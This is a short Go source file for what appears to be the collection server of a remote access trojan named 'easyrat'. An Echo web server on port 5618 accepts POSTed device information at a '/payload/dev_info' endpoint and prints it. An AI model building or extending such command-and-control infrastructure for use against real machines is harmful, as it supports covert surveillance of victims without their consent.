package main

import (
	"easyrat/utils/types"
	"fmt"
	"net/http"

	"github.com/labstack/echo"
)

const (
	port = 5618
)

func main() {
	e := echo.New()
	e.HideBanner = true
	e.GET("/", func(ctx echo.Context) error {
		ctx.String(http.StatusOK, "Hello World!")
		return nil
	})
	e.POST("/payload/dev_info", func(ctx echo.Context) error {
		dev_info := new(types.DeviceInfoStruct)
		ctx.Bind(dev_info)
		fmt.Println(dev_info)
		return ctx.String(http.StatusOK, "Well Done!")
	})
	e.Logger.Fatal(e.Start(":" + fmt.Sprint(port)))
}
